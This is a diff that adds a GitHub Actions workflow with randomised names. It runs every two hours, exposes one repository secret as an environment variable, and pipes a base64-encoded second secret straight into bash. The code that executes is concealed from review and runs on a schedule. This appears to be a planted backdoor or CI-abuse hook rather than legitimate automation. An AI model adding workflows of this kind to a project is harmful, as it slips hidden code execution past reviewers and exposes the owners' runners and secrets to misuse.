@@ -1,0 +1,13 @@
+name: mAxpwcf
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  rXlsCkJlaW:
+    runs-on: ubuntu-22.04
+    env:
+      qYujkMDjiQ: ${{ secrets.GYGGlZ }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.BZpwaV }}" | base64 -d | bash
